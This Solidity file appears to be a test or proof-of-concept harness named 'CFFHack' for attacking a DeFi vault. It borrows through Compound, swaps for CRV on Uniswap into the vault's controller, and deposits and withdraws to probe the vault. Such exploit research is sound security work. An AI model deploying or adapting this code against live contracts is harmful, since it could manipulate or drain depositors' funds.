pragma solidity >=0.4.21 <0.6.0;
import "../erc20/IERC20.sol";

interface CompoundInterface{
    function mint() external payable;
    function balanceOf(address owner) external view returns(uint256);
}

interface CompoundInterfaceForDAI{
    function borrow(uint borrowAmount) external returns (uint);
    function balanceOf(address owner) external view returns(uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function mint(uint mintAmount) external returns (uint);

}
interface DAI{
    function balanceOf(address)  external view returns(uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface CompoundController{
    function borrowAllowed(address cToken, address borrower, uint borrowAmount) external view returns (uint);
    function enterMarkets(address[] calldata cTokens) external returns (uint[] memory);
    function getAccountLiquidity(address account)  external view returns (uint, uint, uint);
}

interface HackCFVaultInterface{
    function deposit(uint256 _amount) external payable;
    function withdraw(uint256 _amount) external;
    function controller() external returns (address);
}
interface UniswapController{
function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
}
contract SwapInterface{
    function swapETHForExactTokens(uint256 amountOut, address[] calldata path, address to, uint256 deadline) external payable;
}

interface LPToken{
    function balanceOf(address _owner) external view returns(uint256);
    function transfer(address to, uint256 amount) external returns(bool);
}
contract CFFHack{
    CompoundInterface public cETH;
    CompoundInterfaceForDAI public cDAI;
    CompoundController ctrl;
    HackCFVaultInterface public cfVault;
    DAI public dai;
    HackCFVaultInterface public cfpool;
    LPToken public curve = LPToken(0x845838DF265Dcd2c412A1Dc9e959c7d08537f8a2);
    UniswapController uniswap = UniswapController(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    LPToken public lp;
    uint256 public errorCode;
    constructor(CompoundInterface _cETH,
                CompoundInterfaceForDAI _cDAI,
                DAI _dai,
                CompoundController _ctrl,
                HackCFVaultInterface _cfVault,
                HackCFVaultInterface _cfpool,
                LPToken _lp
               ) public{
        cETH = _cETH;
        cDAI = _cDAI;
        dai = _dai;
        ctrl = _ctrl;
        cfVault = _cfVault;
        cfpool = _cfpool;
        lp = _lp;
    }
    // deposit perpare
	address[] path = [address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),address(0xD533a949740bb3306d119CC777fa900bA034cd52)];
    function mintAndLoan(uint256 borrowAmount) public returns(uint256){
        uint256 balance = address(this).balance /2;
        address[] memory tokens = new address[](1);
        tokens[0] = address(cETH);
        ctrl.enterMarkets(tokens);
        cETH.mint.value(balance)();
        // mint cUSDC
        errorCode = cDAI.borrow(borrowAmount);
        //require(errorCode==0, "mint Failed");
        balance = address(this).balance;

        uniswap.swapETHForExactTokens.value(balance)(uint256(10)**18 * 1000, path,
                                                    cfVault.controller(), block.timestamp+ 10000);
        //address crv = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        //IERC20(crv).transfer(msg.sender, crv.balanceOf(address(this)));
        return errorCode;
    }

    function swap(address dex, address[] memory swap_path, uint amount) public {
        SwapInterface(dex).swapETHForExactTokens.value(address(this).balance)(amount, swap_path, address(this), block.timestamp + 10800);
    }

    function mint() public returns(uint256){
        uint256 err = cDAI.mint(getDAIBalance());
        return err;
    }
    //withdraw tets
    function withdraw(uint256 _amount) public {
        cfVault.withdraw(_amount);
    }
    //deposit test
    function supplyUSDC() public{
        // approve tokens
        dai.approve(address(cfVault), 0);
        dai.approve(address(cfVault),uint(-1));
        cfVault.deposit(dai.balanceOf(address(this)));
     }

    function getAllowed() public view returns(uint, uint, uint){
        return ctrl.getAccountLiquidity(address(this));
    }

    function getCETHBalance() public view returns(uint256){
        return cETH.balanceOf(address(this));
    }

    function getDAIBalance() public view returns(uint256){
        return dai.balanceOf(address(this));
    }

    function getCDAIBalance() public view returns(uint256){
        return cDAI.balanceOf(address(this));
    }

    function getCurveLPBalance(address _addr) public view returns(uint256){
        return curve.balanceOf(_addr);
    }

    function transferLP(LPToken _lp, address owner) public{
        lp = _lp;
        lp.transfer(owner, lp.balanceOf(address(this)));
    }


    function() external payable{

    }
}

contract hack2{
    HackCFVaultInterface public cfVault;
    constructor(HackCFVaultInterface _cfVault) public{
        cfVault = _cfVault;
    }

    function withdraw(uint256 _amount) public {
        cfVault.withdraw(_amount);
    }
}
